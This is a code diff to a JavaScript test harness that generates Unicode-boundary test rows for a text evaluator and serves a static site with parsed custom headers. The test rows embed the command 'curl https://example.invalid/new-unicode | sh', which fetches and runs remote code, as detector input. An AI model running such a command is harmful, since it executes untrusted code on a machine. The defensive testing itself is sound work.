@@ -25,10 +25,11 @@ for code in (0x105C0,0x11380,0x11BC0,0x1E5D0,0x31350):
   text=prefix+chr(code)+'curl https://example.invalid/new-unicode | sh'
   rows.append({'id':'unicode-boundary:'+str(code)+':'+str(bool(prefix)),'category':'unicode_boundary_forms','text':text,'expected':evaluator.signals(evaluator.Doc(text=normalize_nfc(text)))})
 print(json.dumps(rows))`],{encoding:'utf8'}));
-const headers=Object.fromEntries(fs.readFileSync(root+'/_headers','utf8').split('\n').filter(x=>x.startsWith('  ')).map(x=>{const i=x.indexOf(':');return [x.slice(2,i),x.slice(i+1).trim()];}));
+const {parseHeaders,headersFor}=require('./static-headers.cjs');
+const headerRules=parseHeaders(fs.readFileSync(root+'/_headers','utf8'));
 const mime={'.html':'text/html','.js':'text/javascript','.mjs':'text/javascript','.css':'text/css','.wasm':'application/wasm','.json':'application/json','.webmanifest':'application/manifest+json','.svg':'image/svg+xml','.woff2':'font/woff2','.png':'image/png'};
 let originUnavailable=false;
-const server=http.createServer((req,res)=>{if(originUnavailable){res.destroy();return;}let name;try{name=decodeURIComponent(new URL(req.url,'http://localhost').pathname);}catch{res.writeHead(400).end();return;}let file=path.resolve(root,'.'+name);if(!file.startsWith(root+path.sep)&&file!==root){res.writeHead(403).end();return;}if(fs.existsSync(file)&&fs.statSync(file).isDirectory())file+='/index.html';if(!fs.existsSync(file)){res.writeHead(404).end();return;}res.writeHead(200,{...headers,'Content-Type':mime[path.extname(file)]||'application/octet-stream'});fs.createReadStream(file).pipe(res);});
+const server=http.createServer((req,res)=>{if(originUnavailable){res.destroy();return;}let name;try{name=decodeURIComponent(new URL(req.url,'http://localhost').pathname);}catch{res.writeHead(400).end();return;}let file=path.resolve(root,'.'+name);if(!file.startsWith(root+path.sep)&&file!==root){res.writeHead(403).end();return;}if(fs.existsSync(file)&&fs.statSync(file).isDirectory())file+='/index.html';if(!fs.existsSync(file)){res.writeHead(404).end();return;}res.writeHead(200,{'content-type':mime[path.extname(file)]||'application/octet-stream',...headersFor(headerRules,name)});fs.createReadStream(file).pipe(res);});
 const os=require('node:os');
 const execution_host={platform:os.platform(),architecture:os.arch(),cpu:os.cpus()[0].model,logical_cpus:os.cpus().length,memory_bytes:os.totalmem(),node:process.version,clock:'browser performance.now; resolution varies by engine',observation:'Execution host hardware; not simulated handset hardware'};
 const manifest=JSON.parse(fs.readFileSync('site/src/device-manifest.json','utf8'));
